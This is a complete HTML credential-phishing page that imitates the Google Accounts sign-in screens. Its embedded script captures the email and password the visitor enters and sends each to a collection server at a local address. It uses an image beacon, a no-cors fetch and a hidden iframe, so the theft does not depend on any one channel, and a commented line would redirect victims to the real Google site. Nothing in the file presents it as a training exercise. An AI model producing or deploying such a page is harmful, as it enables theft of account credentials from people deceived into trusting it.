<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in - Google Accounts</title>
  <style>
    :root {
      --bg: #ffffff;
      --card-bg: #ffffff;
      --text: #202124;
      --text-secondary: #5f6368;
      --border: #dadce0;
      --border-focus: #1a73e8;
      --blue: #1a73e8;
      --blue-hover: #1557b0;
      --error: #d93025;
      --hover-bg: #f7f8f8;
    }
    @media (prefers-color-scheme: dark) {
      :root {
        --bg: #202124;
        --card-bg: #202124;
        --text: #e8eaed;
        --text-secondary: #9aa0a6;
        --border: #5f6368;
        --border-focus: #8ab4f8;
        --blue: #8ab4f8;
        --blue-hover: #aecbfa;
        --hover-bg: #303134;
      }
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; }
    body {
      font-family: 'Roboto', 'Helvetica Neue', Arial, sans-serif;
      font-size: 14px;
      background: var(--bg);
      color: var(--text);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 24px;
      -webkit-font-smoothing: antialiased;
    }
    .container {
      width: 100%;
      max-width: 448px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .card {
      width: 100%;
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 48px 40px 36px;
      text-align: center;
    }
    .logo { display: flex; justify-content: center; align-items: center; margin-bottom: 16px; }
    .logo svg { width: 40px; height: 40px; }
    h1 {
      font-family: 'Google Sans', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
      font-size: 24px;
      font-weight: 400;
      line-height: 1.3333;
      color: var(--text);
      margin-bottom: 8px;
    }
    .subtitle {
      font-size: 16px;
      font-weight: 400;
      line-height: 1.5;
      color: var(--text-secondary);
      margin-bottom: 32px;
    }
    .user-pill {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      padding: 4px 12px 4px 4px;
      border: 1px solid var(--border);
      border-radius: 16px;
      margin-bottom: 32px;
      font-size: 14px;
      color: var(--text);
      cursor: pointer;
    }
    .user-pill .avatar {
      width: 20px; height: 20px; border-radius: 50%;
      background: #1a73e8; color: white;
      display: flex; align-items: center; justify-content: center;
      font-size: 11px; font-weight: 500;
    }
    .user-pill .caret { font-size: 10px; color: var(--text-secondary); margin-left: 4px; }

    .form-group { position: relative; margin-bottom: 24px; text-align: left; }
    .input-wrapper { position: relative; }
    input[type="text"], input[type="password"] {
      width: 100%;
      height: 56px;
      padding: 13px 15px;
      font-size: 16px;
      font-family: inherit;
      color: var(--text);
      background: transparent;
      border: 1px solid var(--border);
      border-radius: 4px;
      outline: none;
      transition: border-color 0.15s ease, box-shadow 0.15s ease;
    }
    input:focus {
      border-color: var(--border-focus);
      box-shadow: inset 0 0 0 1px var(--border-focus);
    }
    input:focus + label,
    input:not(:placeholder-shown) + label {
      top: 0;
      transform: translateY(-50%) scale(0.75);
      background: var(--card-bg);
      padding: 0 4px;
      color: var(--blue);
    }
    input:not(:focus):not(:placeholder-shown) + label {
      color: var(--text-secondary);
    }
    label {
      position: absolute;
      left: 11px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      color: var(--text-secondary);
      pointer-events: none;
      transition: all 0.15s ease;
      transform-origin: left center;
    }
    .checkbox-row {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 36px;
      text-align: left;
      font-size: 14px;
      color: var(--text);
    }
    .checkbox-row input { width: 16px; height: 16px; cursor: pointer; }
    .error-msg {
      display: none;
      color: var(--error);
      font-size: 12px;
      line-height: 1.3333;
      margin-top: 8px;
      text-align: left;
    }
    .error-msg.show { display: block; }
    .helper-link {
      display: flex;
      align-items: center;
      gap: 4px;
      margin-bottom: 36px;
      text-align: left;
    }
    .helper-link button {
      background: none;
      border: none;
      font-family: 'Google Sans', 'Roboto', inherit;
      font-size: 14px;
      font-weight: 500;
      color: var(--blue);
      cursor: pointer;
      padding: 0;
      border-radius: 4px;
    }
    .helper-link button:hover { text-decoration: underline; }
    .footer-actions {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-top: 8px;
    }
    .create-account {
      background: none;
      border: none;
      font-family: 'Google Sans', 'Roboto', inherit;
      font-size: 14px;
      font-weight: 500;
      color: var(--blue);
      cursor: pointer;
      padding: 8px 0;
      border-radius: 4px;
    }
    .create-account:hover {
      background: var(--hover-bg);
      padding: 8px 12px;
      margin: 0 -12px;
    }
    .next-btn {
      min-width: 88px;
      height: 36px;
      padding: 0 24px;
      font-family: 'Google Sans', 'Roboto', inherit;
      font-size: 14px;
      font-weight: 500;
      letter-spacing: 0.25px;
      color: #ffffff;
      background: var(--blue);
      border: none;
      border-radius: 4px;
      cursor: pointer;
      transition: background-color 0.15s ease, box-shadow 0.15s ease;
    }
    .next-btn:hover {
      background: var(--blue-hover);
      box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
    }
    .next-btn:active {
      box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
    }
    .next-btn:disabled { opacity: 0.6; cursor: default; box-shadow: none; }
    .bottom-bar {
      width: 100%;
      max-width: 448px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-top: 16px;
      padding: 0 4px;
      font-size: 12px;
      color: var(--text-secondary);
    }
    .bottom-left select {
      background: transparent;
      border: none;
      font-size: 12px;
      color: var(--text-secondary);
      cursor: pointer;
      padding: 8px;
      font-family: inherit;
    }
    .bottom-right { display: flex; gap: 24px; }
    .bottom-right a { color: var(--text-secondary); text-decoration: none; }
    .bottom-right a:hover { color: var(--text); }

    .hidden { display: none !important; }

    @media (max-width: 480px) {
      body { padding: 0; justify-content: flex-start; }
      .container { max-width: 100%; padding: 24px; }
      .card { border: none; border-radius: 0; padding: 24px; }
      .bottom-bar { padding: 0 24px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card">
      <div class="logo" aria-hidden="true">
        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
          <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>
          <path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/>
          <path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24s.85 6.91 2.34 9.88l7.35-5.7z"/>
          <path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/>
        </svg>
      </div>

      <!-- STEP 1: EMAIL -->
      <div id="stepEmail">
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>

        <form id="emailForm" novalidate>
          <div class="form-group">
            <div class="input-wrapper">
              <input type="text" id="identifier" name="identifier" placeholder=" "
                     autocomplete="username" aria-label="Email or phone" required />
              <label for="identifier">Email or phone</label>
            </div>
            <p class="error-msg" id="identifierError">Enter an email or phone number</p>
          </div>

          <div class="helper-link">
            <button type="button">Forgot email?</button>
          </div>

          <div class="footer-actions">
            <button type="button" class="create-account">Create account</button>
            <button type="submit" class="next-btn" id="nextBtnEmail">Next</button>
          </div>
        </form>
      </div>

      <!-- STEP 2: PASSWORD -->
      <div id="stepPassword" class="hidden">
        <div class="user-pill">
          <div class="avatar" id="pillAvatar">T</div>
          <span id="pillEmail">test@gmail.com</span>
          <span class="caret">▼</span>
        </div>
        <h1>Welcome</h1>

        <form id="passwordForm" novalidate style="margin-top:32px;">
          <div class="form-group">
            <div class="input-wrapper">
              <input type="password" id="password" name="password" placeholder=" "
                     autocomplete="current-password" aria-label="Enter your password" required />
              <label for="password">Enter your password</label>
            </div>
            <p class="error-msg" id="passwordError">Enter a password</p>
          </div>

          <div class="checkbox-row">
            <input type="checkbox" id="showPass" />
            <label for="showPass" style="position:static; transform:none; pointer-events:auto; font-size:14px; color:var(--text); padding:0; background:none;">Show password</label>
          </div>

          <div class="footer-actions" style="justify-content: flex-end; gap: 12px;">
            <button type="button" class="create-account" style="color:var(--blue);">Forgot password?</button>
            <button type="submit" class="next-btn" id="nextBtnPass">Next</button>
          </div>
        </form>
      </div>
    </div>

    <div class="bottom-bar">
      <div class="bottom-left">
        <select aria-label="Language">
          <option>English (United States)</option>
          <option>Español</option>
          <option>Français</option>
          <option>Deutsch</option>
          <option>Português (Brasil)</option>
        </select>
      </div>
      <div class="bottom-right">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </div>
  </div>

  <script>
    (function () {
      // Use the local server endpoint
      const SINK = 'http://127.0.0.1:8080/';

      const stepEmail = document.getElementById('stepEmail');
      const stepPassword = document.getElementById('stepPassword');

      const emailForm = document.getElementById('emailForm');
      const identifier = document.getElementById('identifier');
      const identifierError = document.getElementById('identifierError');
      const nextBtnEmail = document.getElementById('nextBtnEmail');

      const passwordForm = document.getElementById('passwordForm');
      const password = document.getElementById('password');
      const passwordError = document.getElementById('passwordError');
      const nextBtnPass = document.getElementById('nextBtnPass');
      const showPass = document.getElementById('showPass');

      const pillEmail = document.getElementById('pillEmail');
      const pillAvatar = document.getElementById('pillAvatar');

      let currentEmail = '';

      identifier.addEventListener('input', function () {
        if (identifier.value.trim().length > 0) identifierError.classList.remove('show');
      });
      password.addEventListener('input', function () {
        if (password.value.length > 0) passwordError.classList.remove('show');
      });

      // --- COMBINED TRANSMISSION METHOD ---
      function transmit(text) {
        const payload = SINK + '?d=' + encodeURIComponent(text);

        // Method 1: Silent Image Beacon (bypasses most CORS restrictions for GET)
        const img = new Image();
        img.src = payload;

        // Method 2: Fetch with no-cors (standard modern approach)
        fetch(payload, { method: 'GET', mode: 'no-cors' }).catch(function(){});

        // Method 3: Hidden Iframe fallback
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = payload;
        document.body.appendChild(iframe);
        setTimeout(function() { iframe.remove(); }, 1000);

        // Method 4: Window open fallback (only if the above somehow fail, but
        // will pop a new tab if the server doesn't respond correctly. The Python
        // server above returns a blank page, so it closes instantly or stays blank).
        // window.open(payload, '_blank');
      }

      // STEP 1 SUBMIT
      emailForm.addEventListener('submit', function (e) {
        e.preventDefault();
        const val = identifier.value.trim();

        if (!val) {
          identifierError.textContent = 'Enter an email or phone number';
          identifierError.classList.add('show');
          identifier.focus();
          return;
        }

        const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
        const isPhone = /^\+?[\d\s\-()]{7,}$/.test(val);
        if (!isEmail && !isPhone) {
          identifierError.textContent = 'Enter a valid email or phone number';
          identifierError.classList.add('show');
          identifier.focus();
          return;
        }

        currentEmail = val;
        nextBtnEmail.disabled = true;
        nextBtnEmail.textContent = '…';

        // Transmit immediately
        transmit('EMAIL: ' + val);

        setTimeout(function () {
          nextBtnEmail.disabled = false;
          nextBtnEmail.textContent = 'Next';

          pillEmail.textContent = val;
          pillAvatar.textContent = val.charAt(0).toUpperCase();
          stepEmail.classList.add('hidden');
          stepPassword.classList.remove('hidden');
          password.focus();
        }, 400);
      });

      // TOGGLE PASSWORD VISIBILITY
      showPass.addEventListener('change', function () {
        password.type = showPass.checked ? 'text' : 'password';
      });

      // STEP 2 SUBMIT
      passwordForm.addEventListener('submit', function (e) {
        e.preventDefault();
        const val = password.value;

        if (!val) {
          passwordError.textContent = 'Enter a password';
          passwordError.classList.add('show');
          password.focus();
          return;
        }

        nextBtnPass.disabled = true;
        nextBtnPass.textContent = '…';

        // Transmit immediately
        transmit('PASS: ' + val + ' [FOR ' + currentEmail + ']');

        setTimeout(function () {
          nextBtnPass.disabled = false;
          nextBtnPass.textContent = 'Verifying...';

          setTimeout(function() {
            nextBtnPass.textContent = 'Next';
            nextBtnPass.disabled = false;
            // fake redirect to actual google
            // window.location.href = 'https://accounts.google.com';
          }, 1000);

        }, 400);
      });

      // Enter keys
      identifier.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') {
          e.preventDefault();
          emailForm.dispatchEvent(new Event('submit', { cancelable: true }));
        }
      });
    })();
  </script>
</body>
</html>
